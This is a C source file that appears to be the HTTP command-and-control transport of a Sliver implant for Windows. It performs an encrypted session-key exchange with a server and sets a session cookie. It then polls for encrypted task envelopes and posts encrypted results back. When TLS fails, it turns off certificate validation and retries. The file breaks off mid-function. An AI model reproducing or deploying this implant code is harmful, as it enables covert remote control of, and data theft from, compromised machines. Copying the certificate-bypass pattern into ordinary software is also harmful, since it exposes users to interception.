#include "pch.h"

LPSTR GetContentTypeString
(
	_In_ ContentTy ContentTypeEnum
)
{
	if (ContentTypeEnum == ApplicationAtomXml) {
		return DuplicateStrA("application/atom+xml", 0);
	}
	else if (ContentTypeEnum == ApplicationHttp) {
		return DuplicateStrA("application/http", 0);
	}
	else if (ContentTypeEnum == ApplicationJavascript) {
		return DuplicateStrA("application/javascript", 0);
	}
	else if (ContentTypeEnum == ApplicationJson) {
		return DuplicateStrA("application/json", 0);
	}
	else if (ContentTypeEnum == ApplicationXjson) {
		return DuplicateStrA("application/x-json", 0);
	}
	else if (ContentTypeEnum == ApplicationOctetstream) {
		return DuplicateStrA("application/octet-stream", 0);
	}
	else if (ContentTypeEnum == ApplicationXWwwFormUrlencoded) {
		return DuplicateStrA("application/x-www-form-urlencoded", 0);
	}
	else if (ContentTypeEnum == MultipartFormData) {
		return DuplicateStrA("multipart/form-data", 0);
	}
	else if (ContentTypeEnum == Boundary) {
		return DuplicateStrA("boundary", 0);
	}
	else if (ContentTypeEnum == FormData) {
		return DuplicateStrA("form-data", 0);
	}
	else if (ContentTypeEnum == ApplicationXjavascript) {
		return DuplicateStrA("application/x-javascript", 0);
	}
	else if (ContentTypeEnum == ApplicationXml) {
		return DuplicateStrA("application/xml", 0);
	}
	else if (ContentTypeEnum == MessageHttp) {
		return DuplicateStrA("message/http", 0);
	}
	else if (ContentTypeEnum == Text) {
		return DuplicateStrA("text", 0);
	}
	else if (ContentTypeEnum == TextJavascript) {
		return DuplicateStrA("text/javascript", 0);
	}
	else if (ContentTypeEnum == TextJson) {
		return DuplicateStrA("text/json", 0);
	}
	else if (ContentTypeEnum == TextPlain) {
		return DuplicateStrA("text/plain", 0);
	}
	else if (ContentTypeEnum == TextPlainUtf16) {
		return DuplicateStrA("text/plain; charset=utf-16", 0);
	}
	else if (ContentTypeEnum == TextPlainUtf16le) {
		return DuplicateStrA("text/plain; charset=utf-16le", 0);
	}
	else if (ContentTypeEnum == TextPlainUtf8) {
		return DuplicateStrA("text/plain; charset=utf-8", 0);
	}
	else if (ContentTypeEnum == TextXjavascript) {
		return DuplicateStrA("text/x-javascript", 0);
	}
	else if (ContentTypeEnum == TextXjson) {
		return DuplicateStrA("text/x-json", 0);
	}
}

LPSTR GetHeaderString
(
	_In_ HttpHeader HeaderTy
)
{
	if (HeaderTy == Accept) {
		return DuplicateStrA("Accept", 0);
	}
	else if (HeaderTy == AcceptCharset) {
		return DuplicateStrA("Accept-Charset", 0);
	}
	else if (HeaderTy == AcceptEncoding) {
		return DuplicateStrA("Accept-Encoding", 0);
	}
	else if (HeaderTy == AcceptLanguage) {
		return DuplicateStrA("Accept-Language", 0);
	}
	else if (HeaderTy == AcceptRanges) {
		return DuplicateStrA("Accept-Ranges", 0);
	}
	else if (HeaderTy == AccessControlAllowOrigin) {
		return DuplicateStrA("Access-Control-Allow-Origin", 0);
	}
	else if (HeaderTy == Age) {
		return DuplicateStrA("Age", 0);
	}
	else if (HeaderTy == Allow) {
		return DuplicateStrA("Allow", 0);
	}
	else if (HeaderTy == Authorization) {
		return DuplicateStrA("Authorization", 0);
	}
	else if (HeaderTy == CacheControl) {
		return DuplicateStrA("Cache-Control", 0);
	}
	else if (HeaderTy == Cookie) {
		return DuplicateStrA("Cookie", 0);
	}
	else if (HeaderTy == Connection) {
		return DuplicateStrA("Connection", 0);
	}
	else if (HeaderTy == ContentEncoding) {
		return DuplicateStrA("Content-Encoding", 0);
	}
	else if (HeaderTy == ContentLanguage) {
		return DuplicateStrA("Content-Language", 0);
	}
	else if (HeaderTy == ContentLength) {
		return DuplicateStrA("Content-Length", 0);
	}
	else if (HeaderTy == ContentLocation) {
		return DuplicateStrA("Content-Location", 0);
	}
	else if (HeaderTy == ContentMd5) {
		return DuplicateStrA("Content-MD5", 0);
	}
	else if (HeaderTy == ContentRange) {
		return DuplicateStrA("Content-Range", 0);
	}
	else if (HeaderTy == ContentType) {
		return DuplicateStrA("Content-Type", 0);
	}
	else if (HeaderTy == ContentDisposition) {
		return DuplicateStrA("Content-Disposition", 0);
	}
	else if (HeaderTy == Date) {
		return DuplicateStrA("Date", 0);
	}
	else if (HeaderTy == Etag) {
		return DuplicateStrA("ETag", 0);
	}
	else if (HeaderTy == Expect) {
		return DuplicateStrA("Expect", 0);
	}
	else if (HeaderTy == Expires) {
		return DuplicateStrA("Expires", 0);
	}
	else if (HeaderTy == From) {
		return DuplicateStrA("From", 0);
	}
	else if (HeaderTy == Host) {
		return DuplicateStrA("Host", 0);
	}
	else if (HeaderTy == IfMatch) {
		return DuplicateStrA("If-Match", 0);
	}
	else if (HeaderTy == IfModifiedSince) {
		return DuplicateStrA("If-Modified-Since", 0);
	}
	else if (HeaderTy == IfNoneMatch) {
		return DuplicateStrA("If-None-Match", 0);
	}
	else if (HeaderTy == IfRange) {
		return DuplicateStrA("If-Range", 0);
	}
	else if (HeaderTy == IfUnmodifiedSince) {
		return DuplicateStrA("If-Unmodified-Since", 0);
	}
	else if (HeaderTy == LastModified) {
		return DuplicateStrA("Last-Modified", 0);
	}
	else if (HeaderTy == Location) {
		return DuplicateStrA("Location", 0);
	}
	else if (HeaderTy == MaxForwards) {
		return DuplicateStrA("Max-Forwards", 0);
	}
	else if (HeaderTy == Pragma) {
		return DuplicateStrA("Pragma", 0);
	}
	else if (HeaderTy == ProxyAuthenticate) {
		return DuplicateStrA("Proxy-Authenticate", 0);
	}
	else if (HeaderTy == ProxyAuthorization) {
		return DuplicateStrA("Proxy-Authorization", 0);
	}
	else if (HeaderTy == Range) {
		return DuplicateStrA("Range", 0);
	}
	else if (HeaderTy == Referer) {
		return DuplicateStrA("Referer", 0);
	}
	else if (HeaderTy == RetryAfter) {
		return DuplicateStrA("Retry-After", 0);
	}
	else if (HeaderTy == Server) {
		return DuplicateStrA("Server", 0);
	}
	else if (HeaderTy == SetCookie) {
		return DuplicateStrA("Set-Cookie", 0);
	}
	else if (HeaderTy == Te) {
		return DuplicateStrA("TE", 0);
	}
	else if (HeaderTy == Trailer) {
		return DuplicateStrA("Trailer", 0);
	}
	else if (HeaderTy == TransferEncoding) {
		return DuplicateStrA("Transfer-Encoding", 0);
	}
	else if (HeaderTy == Upgrade) {
		return DuplicateStrA("Upgrade", 0);
	}
	else if (HeaderTy == UserAgent) {
		return DuplicateStrA("User-Agent", 0);
	}
	else if (HeaderTy == Vary) {
		return DuplicateStrA("Vary", 0);
	}
	else if (HeaderTy == Via) {
		return DuplicateStrA("Via", 0);
	}
	else if (HeaderTy == Warning) {
		return DuplicateStrA("Warning", 0);
	}
	else if (HeaderTy == WwwAuthenticate) {
		return DuplicateStrA("WWW-Authenticate", 0);
	}
	else if (HeaderTy == UpgradeInsecureRequests) {
		return DuplicateStrA("Upgrade-Insecure-Requests", 0);
	}
	// UpgradeInsecureRequests
}

static DWORD WinHttpDefaultProxyConstant(VOID)
{
#if _WIN32_WINNT >= _WIN32_WINNT_VISTA
#if _WIN32_WINNT < _WIN32_WINNT_WINBLUE
	if (!FSecure::IsWindows8Point1OrGreater())
	{
		// Not Windows 8.1 or later, use the default proxy setting
		return WINHTTP_ACCESS_TYPE_DEFAULT_PROXY;
	}
#endif // _WIN32_WINNT < _WIN32_WINNT_WINBLUE

	// Windows 8.1 or later, use the automatic proxy setting
	return WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY;
#else  // ^^^ _WIN32_WINNT >= _WIN32_WINNT_VISTA ^^^ // vvv _WIN32_WINNT < _WIN32_WINNT_VISTA vvv
	return WINHTTP_ACCESS_TYPE_DEFAULT_PROXY;
#endif // _WIN32_WINNT >= _WIN32_WINNT_VISTA
}

PHTTP_SESSION HttpSessionInit
(
	_In_ PURI pUri,
	_In_ LPWSTR lpProxy
)
{
	PHTTP_SESSION Result = NULL;
	LPWSTR lpFullUri = NULL;

	Result = ALLOC(sizeof(HTTP_SESSION));
	if (lpProxy == NULL) {
		Result->hSession = WinHttpOpen(NULL, WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
	}
	else {
		Result->hSession = WinHttpOpen(NULL, WINHTTP_ACCESS_TYPE_NAMED_PROXY, lpProxy, L"<local>", 0);
	}

	if (!Result->hSession) {
		LOG_ERROR("WinHttpOpen", GetLastError());
		FreeHttpSession(Result);
		Result = NULL;
		goto CLEANUP;
	}

	lpFullUri = ConvertCharToWchar(pUri->lpFullUri);
	Result->pProxyInfo = ResolveProxy(Result->hSession, lpFullUri);
	if (Result->pProxyInfo != NULL) {
		WinHttpSetOption(Result->hSession, WINHTTP_OPTION_PROXY, Result->pProxyInfo, sizeof(WINHTTP_PROXY_INFO));
	}
	
CLEANUP:
	FREE(lpFullUri);
	return Result;
}

PHTTP_CLIENT HttpClientInit
(
	_In_ PURI pUri,
	_In_ LPWSTR lpProxy
)
{
	PHTTP_CLIENT Result = NULL;
	LPWSTR lpHostName = NULL;

	lpHostName = ConvertCharToWchar(pUri->lpHostName);
	Result = ALLOC(sizeof(HTTP_CLIENT));
	Result->pUri = pUri;
	Result->pHttpSession = HttpSessionInit(pUri, lpProxy);
	if (Result->pHttpSession == NULL) {
		FreeHttpClient(Result);
		Result = NULL;
		goto CLEANUP;
	}

	Result->hConnection = WinHttpConnect(Result->pHttpSession->hSession, lpHostName, pUri->wPort, 0);
	if (Result->hConnection == NULL) {
		LOG_ERROR("WinHttpConnect", GetLastError());
		FreeHttpClient(Result);
		Result = NULL;
		goto CLEANUP;
	}

CLEANUP:
	FREE(lpHostName);
	return Result;
}

BOOL SetHeader
(
	_In_ HINTERNET hRequest,
	_In_ LPSTR lpHeaderName,
	_In_ LPSTR lpHeaderData
)
{
	LPWSTR lpHeaderNameW = ConvertCharToWchar(lpHeaderName);
	LPWSTR lpHeaderDataW = ConvertCharToWchar(lpHeaderData);
	DWORD dwBufferLength = lstrlenW(lpHeaderNameW) + lstrlenW(lpHeaderDataW) + 10;
	LPWSTR lpFullHeader = ALLOC(dwBufferLength * sizeof(WCHAR));
	BOOL Result = FALSE;

	wsprintfW(lpFullHeader, L"%s: %s", lpHeaderNameW, lpHeaderDataW);
	if (StrCmpW(&lpFullHeader[lstrlenW(lpFullHeader) - 2], L"\r\n")) {
		StrCatW(lpFullHeader, L"\r\n");
	}

	Result = WinHttpAddRequestHeaders(hRequest, lpFullHeader, -1, WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);
	if (!Result) {
		LOG_ERROR("WinHttpAddRequestHeaders", GetLastError());
	}

	FREE(lpFullHeader);
	FREE(lpHeaderNameW);
	FREE(lpHeaderDataW);

	return Result;
}

HINTERNET SendRequest
(
	_In_ PHTTP_CLIENT pHttpClient,
	_In_ PHTTP_REQUEST pRequest,
	_In_ LPSTR lpPath,
	_In_ DWORD dwNumberOfAttemps
)
{
	LPWSTR lpMethod = NULL;
	PURI pUri = pHttpClient->pUri;
	LPWSTR pPath = NULL;
	HINTERNET hRequest = NULL;
	DWORD i = 0;
	PWINHTTP_PROXY_INFO pProxyInfo = NULL;
	DWORD dwLastError = 0;
	DWORD dwFlag = WINHTTP_FLAG_REFRESH;
	LPSTR lpHeaderStr = NULL;
	LPWSTR lpFullUri = NULL;

	if (lpPath != NULL) {
		pPath = ConvertCharToWchar(lpPath);
	}
	else if (lstrlenA(pUri->lpPathWithQuery) > 0) {
		pPath = ConvertCharToWchar(pUri->lpPathWithQuery);
	}

	lpMethod = ConvertCharToWchar(pRequest->Method);
	if (pUri->bUseHttps) {
		dwFlag |= WINHTTP_FLAG_SECURE;
	}

	hRequest = WinHttpOpenRequest(pHttpClient->hConnection, lpMethod, pPath, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, dwFlag);
	if (hRequest == NULL) {
		LOG_ERROR("WinHttpOpenRequest", GetLastError());
		goto CLEANUP;
	}

	if (!WinHttpSetTimeouts(hRequest, pRequest->dwResolveTimeout, pRequest->dwConnectTimeout, pRequest->dwSendTimeout, pRequest->dwReceiveTimeout)) {
		LOG_ERROR("WinHttpSetTimeouts", GetLastError());
		goto CLEANUP;
	}

	for (i = 0; i < _countof(pRequest->Headers); i++) {
		if (pRequest->Headers[i]) {
			lpHeaderStr = GetHeaderString(i);
			SetHeader(hRequest, lpHeaderStr, pRequest->Headers[i]);
			FREE(lpHeaderStr);
		}
	}

	lpFullUri = ConvertCharToWchar(pUri->lpFullUri);
	pProxyInfo = ResolveProxy(pHttpClient->pHttpSession->hSession, lpFullUri);
	if (pProxyInfo != NULL) {
		WinHttpSetOption(hRequest, WINHTTP_OPTION_PROXY, pProxyInfo, sizeof(WINHTTP_PROXY_INFO));
	}

	i = 0;
	while (!WinHttpSendRequest(hRequest, NULL, 0, pRequest->lpData, pRequest->cbData, pRequest->cbData, 0)) {
		dwLastError = GetLastError();
		LOG_ERROR("WinHttpSendRequest", dwLastError);
		if (dwLastError == ERROR_WINHTTP_RESEND_REQUEST) {
			continue;
		}

		if (dwLastError == ERROR_WINHTTP_TIMEOUT) {
			WinHttpCloseHandle(hRequest);
			hRequest = NULL;
			goto CLEANUP;
		}

		if (dwLastError == ERROR_WINHTTP_SECURE_FAILURE) {
			dwFlag = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
			WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlag, sizeof(dwFlag));
			continue;
		}

		i++;
		if (i > dwNumberOfAttemps) {
			WinHttpCloseHandle(hRequest);
			hRequest = NULL;
			goto CLEANUP;
		}
	}

	if (!WinHttpReceiveResponse(hRequest, NULL)) {
		LOG_ERROR("WinHttpReceiveResponse", GetLastError());
		WinHttpCloseHandle(hRequest);
		hRequest = NULL;
		goto CLEANUP;
	}

CLEANUP:
	FREE(lpFullUri);
	FREE(lpMethod);
	FREE(pPath);
	FreeWinHttpProxyInfo(pProxyInfo);

	return hRequest;
}

DWORD ReadStatusCode
(
	_In_ HINTERNET hRequest
)
{
	DWORD dwResult = 0;
	DWORD dwSize = sizeof(dwResult);

	if (!WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, WINHTTP_HEADER_NAME_BY_INDEX, &dwResult, &dwSize, WINHTTP_NO_HEADER_INDEX)) {
		LOG_ERROR("WinHttpQueryHeaders", GetLastError());
		return 0;
	}

	return dwResult;
}

PBUFFER ReceiveData
(
	_In_ HINTERNET hRequest
)
{
	DWORD dwNumberOfBytesAvailable = 0;
	DWORD dwNumberOfBytesRead = 0;
	PBUFFER pResult = NULL;

	pResult = ALLOC(sizeof(BUFFER));
	do {
		dwNumberOfBytesAvailable = 0;
		if (!WinHttpQueryDataAvailable(hRequest, &dwNumberOfBytesAvailable)) {
			LOG_ERROR("WinHttpQueryDataAvailable", GetLastError());
			FreeBuffer(pResult);
			pResult = NULL;
			goto CLEANUP;
		}

		if (dwNumberOfBytesAvailable == 0) {
			break;
		}

		if (pResult->pBuffer == NULL) {
			pResult->pBuffer = ALLOC(dwNumberOfBytesAvailable);
		}
		else {
			pResult->pBuffer = REALLOC(pResult->pBuffer, pResult->cbBuffer + dwNumberOfBytesAvailable);
		}

		dwNumberOfBytesRead = 0;
		if (!WinHttpReadData(hRequest, &pResult->pBuffer[pResult->cbBuffer], dwNumberOfBytesAvailable, &dwNumberOfBytesRead)) {
			LOG_ERROR("WinHttpReadData", GetLastError());
			FreeBuffer(pResult);
			pResult = NULL;
			goto CLEANUP;
		}

		if (dwNumberOfBytesRead == 0) {
			break;
		}

		pResult->cbBuffer += dwNumberOfBytesRead;
	} while (dwNumberOfBytesAvailable > 0);

	if (pResult->pBuffer != NULL) {
		pResult->pBuffer = REALLOC(pResult->pBuffer, pResult->cbBuffer + 1);
	}

CLEANUP:
	return pResult;
}

VOID FreeHttpSession
(
	_In_ PHTTP_SESSION pHttpSession
)
{
	if (pHttpSession != NULL) {
		FreeWinHttpProxyInfo(pHttpSession->pProxyInfo);
		if (pHttpSession->hSession != NULL) {
			WinHttpCloseHandle(pHttpSession->hSession);
		}

		FREE(pHttpSession);
	}
}

VOID FreeHttpClient
(
	_In_ PHTTP_CLIENT pHttpClient
)
{
	if (pHttpClient != NULL) {
		FreeUri(pHttpClient->pUri);
		FreeHttpSession(pHttpClient->pHttpSession);
		if (pHttpClient->hConnection != NULL) {
			WinHttpCloseHandle(pHttpClient->hConnection);
		}

		FREE(pHttpClient);
	}
}

VOID FreeHttpRequest
(
	_In_ PHTTP_REQUEST pHttpReq
)
{
	DWORD i = 0;

	if (pHttpReq != NULL) {
		for (i = 0; i < _countof(pHttpReq->Headers); i++) {
			FREE(pHttpReq->Headers[i]);
		}

		FREE(pHttpReq->Method);
		FREE(pHttpReq);
	}
}

PHTTP_REQUEST CreateHttpRequest
(
	_In_ PHTTP_CONFIG pHttpConfig,
	_In_ LPSTR lpMethod,
	_In_ LPSTR lpData,
	_In_ DWORD cbData
)
{
	PHTTP_REQUEST Result = NULL;

	Result = ALLOC(sizeof(HTTP_REQUEST));
	Result->dwConnectTimeout = pHttpConfig->dwConnectTimeout;
	Result->dwResolveTimeout = pHttpConfig->dwResolveTimeout;
	Result->dwSendTimeout = pHttpConfig->dwSendTimeout;
	Result->dwReceiveTimeout = pHttpConfig->dwReceiveTimeout;
	if (lpData != NULL && cbData > 0) {
		Result->lpData = lpData;
		Result->cbData = cbData;
	}

	Result->Method = DuplicateStrA(lpMethod, 0);
	return Result;
}

VOID FreeHttpResp
(
	_In_ PHTTP_RESP pResp
)
{
	if (pResp != NULL) {
		if (pResp->hRequest != NULL) {
			WinHttpCloseHandle(pResp->hRequest);
		}

		FREE(pResp->pRespData);
		FREE(pResp);
	}
}

PHTTP_RESP SendHttpRequest
(
	_In_ PHTTP_CONFIG pHttpConfig,
	_In_ PHTTP_CLIENT pHttpClient,
	_In_ LPWSTR lpPath,
	_In_ LPSTR lpMethod,
	_In_ LPSTR lpContentType,
	_In_ LPSTR lpData,
	_In_ DWORD cbData,
	_In_ BOOL SetAuthorizationHeader,
	_In_ BOOL GetRespData
)
{
	PHTTP_REQUEST pHttpRequest = NULL;
	HINTERNET hRequest = NULL;
	DWORD dwStatusCode = 0;
	DWORD i = 0;
	PHTTP_RESP pResult = NULL;
	LPSTR lpAuthorizationHeader = NULL;
	PBUFFER pReceivedData = NULL;

	pHttpRequest = CreateHttpRequest(pHttpConfig, lpMethod, lpData, cbData);
	for (i = 0; i < HeaderEnumEnd; i++) {
		if (pHttpConfig->AdditionalHeaders[i] != NULL) {
			pHttpRequest->Headers[i] = DuplicateStrA(pHttpConfig->AdditionalHeaders[i], 0);
		}
	}

	if (lpContentType != NULL) {
		FREE(pHttpRequest->Headers[ContentType]);
		pHttpRequest->Headers[ContentType] = DuplicateStrA(lpContentType, 0);
	}

	FREE(pHttpRequest->Headers[CacheControl]);
	pHttpRequest->Headers[CacheControl] = DuplicateStrA("no-cache", 0);
	FREE(pHttpRequest->Headers[UserAgent]);
	pHttpRequest->Headers[UserAgent] = DuplicateStrA(pHttpConfig->lpUserAgent, 0);
	if (SetAuthorizationHeader) {
		lpAuthorizationHeader = DuplicateStrA("Bearer ", lstrlenA(pHttpConfig->lpAccessToken));
		lstrcatA(lpAuthorizationHeader, pHttpConfig->lpAccessToken);
		FREE(pHttpRequest->Headers[Authorization]);
		pHttpRequest->Headers[Authorization] = lpAuthorizationHeader;
	}

	if (!pHttpClient->pUri->bUseHttps && !pHttpConfig->DisableUpgradeHeader) {
		FREE(pHttpRequest->Headers[UpgradeInsecureRequests]);
		pHttpRequest->Headers[UpgradeInsecureRequests] = DuplicateStrA("1", 0);
	}

	hRequest = SendRequest(pHttpClient, pHttpRequest, lpPath, pHttpConfig->dwNumberOfAttemps);
	if (hRequest == NULL) {
		goto CLEANUP;
	}

	pResult = ALLOC(sizeof(HTTP_RESP));
	dwStatusCode = ReadStatusCode(hRequest);
	if ((dwStatusCode == HTTP_STATUS_OK || dwStatusCode == HTTP_STATUS_ACCEPTED) && GetRespData) {
		pReceivedData = ReceiveData(hRequest);
		pResult->cbResp = pReceivedData->cbBuffer;
		pResult->pRespData = pReceivedData->pBuffer;
		pReceivedData->pBuffer = NULL;
	}

	pResult->hRequest = hRequest;
	pResult->dwStatusCode = dwStatusCode;
CLEANUP:
	FreeHttpRequest(pHttpRequest);
	FreeBuffer(pReceivedData);

	return pResult;
};

PSLIVER_HTTP_CLIENT HttpInit
(
	_In_ PGLOBAL_CONFIG pGlobalConfig,
	_In_ PHTTP_PROFILE pProfile
)
{
	PSLIVER_HTTP_CLIENT pResult = NULL;

	pResult = ALLOC(sizeof(SLIVER_HTTP_CLIENT));
	pResult->pHttpConfig = ALLOC(sizeof(HTTP_CONFIG));
	pResult->pHttpConfig->lpUserAgent = DuplicateStrA(pProfile->lpUserAgent, 0);
	pResult->pHttpConfig->dwNumberOfAttemps = 10;
	pResult->OtpData.lpBase32Secret = DuplicateStrA(pProfile->lpOtpSecret, 0);
	pResult->OtpData.dwInterval = 30;
	pResult->OtpData.dwDigits = 8;
	pResult->pProfile = pProfile;
	pResult->pGlobalConfig = pGlobalConfig;

	return pResult;
}

PENVELOPE HttpRecv
(
	_In_ PGLOBAL_CONFIG pConfig,
	_In_ PSLIVER_HTTP_CLIENT pHttpClient
)
{
	LPSTR lpUri = NULL;
	PHTTP_RESP pResp = NULL;
	PURI pUri = NULL;
	PENVELOPE pResult = NULL;
	PBUFFER pDecodedData = NULL;
	DWORD cbDecodedData = 0;
	PBUFFER pPlainText = NULL;

	lpUri = CreatePollURL(pConfig, pHttpClient);
	if (lpUri == NULL) {
		goto CLEANUP;
	}

	pUri = UriInit(lpUri);
	pResp = SendHttpRequest(pHttpClient->pHttpConfig, pHttpClient->pHttpClient, pUri->lpPathWithQuery, "GET", NULL, NULL, 0, FALSE, TRUE);
	if (pResp == NULL) {
		goto CLEANUP;
	}

	if (pResp->dwStatusCode == HTTP_STATUS_NO_CONTENT) {
		pResult = ALLOC(sizeof(ENVELOPE));
		goto CLEANUP;
	}

	if (pResp == NULL || pResp->pRespData == NULL || pResp->cbResp == 0 || pResp->dwStatusCode != HTTP_STATUS_OK) {
		goto CLEANUP;
	}

	pDecodedData = Base64Decode(pResp->pRespData);
	pPlainText = SliverDecrypt(pConfig->pSessionKey, pDecodedData);
	pResult = UnmarshalEnvelope(pPlainText);
CLEANUP:
	FREE(lpUri);
	FreeBuffer(pPlainText);
	FreeBuffer(pDecodedData);
	FreeUri(pUri);
	FreeHttpResp(pResp);

	return pResult;
}

BOOL HttpSend
(
	_In_ PGLOBAL_CONFIG pConfig,
	_In_ PSLIVER_HTTP_CLIENT pHttpClient,
	_In_ PENVELOPE pEnvelope
)
{
	PBUFFER pMarshaledEnvelope = NULL;
	PBUFFER pCipherText = NULL;
	LPSTR lpEncodedData = NULL;
	LPSTR lpUri = NULL;
	PURI pUri = NULL;
	PHTTP_RESP pResp = NULL;
	BOOL Result = FALSE;

	if (pEnvelope == NULL) {
		goto CLEANUP;
	}

#ifdef _DEBUG
	if (pEnvelope->pData != NULL) {
		PrintFormatA("Write Envelope:\n");
		HexDump(pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer);
	}
	else {
		PrintFormatW(L"Write Envelope: []\n");
	}
#endif

	pMarshaledEnvelope = MarshalEnvelope(pEnvelope);
	pCipherText = SliverEncrypt(pConfig->pSessionKey, pMarshaledEnvelope);
	lpUri = CreateSessionURL(pConfig, pHttpClient);
	pUri = UriInit(lpUri);
	if (pUri == NULL) {
		goto CLEANUP;
	}

	lpEncodedData = Base64Encode(pCipherText->pBuffer, pCipherText->cbBuffer, FALSE);
	pResp = SendHttpRequest(pHttpClient->pHttpConfig, pHttpClient->pHttpClient, pUri->lpPathWithQuery, "POST", NULL, lpEncodedData, lstrlenA(lpEncodedData), FALSE, FALSE);
	if (pResp == NULL || (pResp->dwStatusCode != HTTP_STATUS_OK && pResp->dwStatusCode != HTTP_STATUS_ACCEPTED)) {
		goto CLEANUP;
	}

	Result = TRUE;
CLEANUP:
	FREE(lpUri);
	FREE(lpEncodedData);
	FreeUri(pUri);
	FreeBuffer(pCipherText);
	FreeBuffer(pMarshaledEnvelope);
	FreeHttpResp(pResp);

	return Result;
}

BOOL HttpClose
(
	_In_ PSLIVER_HTTP_CLIENT pSliverHttpClient
)
{
	PHTTP_CLIENT pHttpClient = NULL;

	pHttpClient = pSliverHttpClient->pHttpClient;
	if (pSliverHttpClient != NULL && pHttpClient != NULL) {
		if (pHttpClient->hConnection != NULL) {
			WinHttpCloseHandle(pHttpClient->hConnection);
			pHttpClient->hConnection = NULL;
		}

		if (pHttpClient->pHttpSession->hSession != NULL) {
			WinHttpCloseHandle(pHttpClient->pHttpSession->hSession);
			pHttpClient->pHttpSession->hSession = NULL;
		}
	}

	return TRUE;
}

VOID FreeHttpConfig
(
	_In_ PHTTP_CONFIG pHttpConfig
)
{
	DWORD i = 0;
	if (pHttpConfig != NULL) {
		FREE(pHttpConfig->lpUserAgent);
		FREE(pHttpConfig->lpAccessToken);
		for (i = 0; i < _countof(pHttpConfig->AdditionalHeaders); i++) {
			FREE(pHttpConfig->AdditionalHeaders[i]);
		}

		FREE(pHttpConfig);
	}
}

BOOL HttpCleanup
(
	_In_ PSLIVER_HTTP_CLIENT pSliverHttpClient
)
{
	if (pSliverHttpClient != NULL) {
		FREE(pSliverHttpClient->lpPathPrefix);
		FREE(pSliverHttpClient->OtpData.lpBase32Secret);
		FreeHttpConfig(pSliverHttpClient->pHttpConfig);
		FreeHttpClient(pSliverHttpClient->pHttpClient);
		FREE(pSliverHttpClient);
	}

	return TRUE;
}

BOOL HttpStart
(
	_In_ PSLIVER_HTTP_CLIENT pHttpClient
)
{
	LPSTR lpFullUri = NULL;
	PURI pUri = NULL;
	DWORD cbResp = 0;
	LPSTR lpEncodedSessionKey = NULL;
	BOOL Result = FALSE;
	PHTTP_RESP pResp = NULL;
	PBUFFER pDecodedResp = NULL;
	DWORD cbDecodedResp = 0;
	PBUFFER pSessionId = NULL;
	PBYTE pEncryptedSessionInit = NULL;
	DWORD cbEncryptedSessionInit = 0;
	PPBElement pMarshaledData = NULL;
	DWORD dwSetCookieLength = 0;
	WCHAR wszSetCookie[0x100];
	LPWSTR lpTemp = NULL;
	LPSTR lpCookiePrefix = NULL;
	PGLOBAL_CONFIG pGlobalConfig = NULL;

	SecureZeroMemory(wszSetCookie, sizeof(wszSetCookie));
	pGlobalConfig = pHttpClient->pGlobalConfig;
	lpFullUri = StartSessionURL(pGlobalConfig, pHttpClient);
	if (lpFullUri == NULL) {
		goto CLEANUP;
	}

	pUri = UriInit(lpFullUri);
	if (pUri == NULL) {
		goto CLEANUP;
	}

	pHttpClient->pHttpClient = HttpClientInit(pUri, pGlobalConfig->lpProxy);
	if (pHttpClient->pHttpClient == NULL) {
		goto CLEANUP;
	}

	pMarshaledData = CreateBytesElement(pGlobalConfig->pSessionKey, CHACHA20_KEY_SIZE, 1);
	pEncryptedSessionInit = AgeKeyExToServer(pGlobalConfig->lpRecipientPubKey, pGlobalConfig->lpPeerPrivKey, pGlobalConfig->lpPeerPubKey, pMarshaledData->pMarshaledData, pMarshaledData->cbMarshaledData, &cbEncryptedSessionInit);
	if (pEncryptedSessionInit == NULL || cbEncryptedSessionInit == 0) {
		goto CLEANUP;
	}

	lpEncodedSessionKey = Base64Encode(pEncryptedSessionInit, cbEncryptedSessionInit, FALSE);
	pResp = SendHttpRequest(pHttpClient->pHttpConfig, pHttpClient->pHttpClient, NULL, "POST", NULL, lpEncodedSessionKey, lstrlenA(lpEncodedSessionKey), FALSE, TRUE);
	if (pResp == NULL || pResp->pRespData == NULL || pResp->cbResp == 0 || pResp->dwStatusCode != HTTP_STATUS_OK) {
		goto CLEANUP;
	}

	pDecodedResp = Base64Decode(pResp->pRespData);
	pSessionId = SliverDecrypt(pGlobalConfig->pSessionKey, pDecodedResp);
	memcpy(pGlobalConfig->szSessionID, pSessionId->pBuffer, 0x20);
	pGlobalConfig->szSessionID[0x20] = '\0';
	dwSetCookieLength = sizeof(wszSetCookie);
	if (!WinHttpQueryHeaders(pResp->hRequest, WINHTTP_QUERY_SET_COOKIE, NULL, wszSetCookie, &dwSetCookieLength, WINHTTP_NO_HEADER_INDEX)) {
		LOG_ERROR("WinHttpQueryHeaders", GetLastError());
		goto CLEANUP;
	}

	lpTemp = StrChrW(wszSetCookie, L'=');
	lpTemp[0] = L'\0';
	lpCookiePrefix = ConvertWcharToChar(wszSetCookie);
	pHttpClient->pHttpConfig->AdditionalHeaders[Cookie] = ALLOC(lstrlenA(pGlobalConfig->szSessionID) + lstrlenA(lpCookiePrefix) + 2);
	wsprintfA(pHttpClient->pHttpConfig->AdditionalHeaders[Cookie], "%s=%s", lpCookiePrefix, pGlobalConfig->szSessionID);
	Result = TRUE;
CLEANUP:
	FREE(lpEncodedSessionKey);
	FREE(lpFullUri);
	FREE(lpCookiePrefix);
	FREE(pEncryptedSessionInit);
	FreeBuffer(pDecodedResp);
	FreeBuffer(pSessionId);
	FreeElement(pMarshaledData);
	FreeHttpResp(pResp);

	return Result;
}

LPSTR JoinUrlPath
(
	_In_ PSLIVER_HTTP_CLIENT pClient,
	_In_ LPSTR* pSegments,
	_In_ DWORD cSegment
)
{
	LPSTR lpResult = NULL;
	DWORD cbResult = 0;
	DWORD dwPos = 0;
	DWORD cbPathPrefix = 0;
	DWORD i = 0;

	cbResult = 0x100;
	lpResult = ALLOC(cbResult + 1);
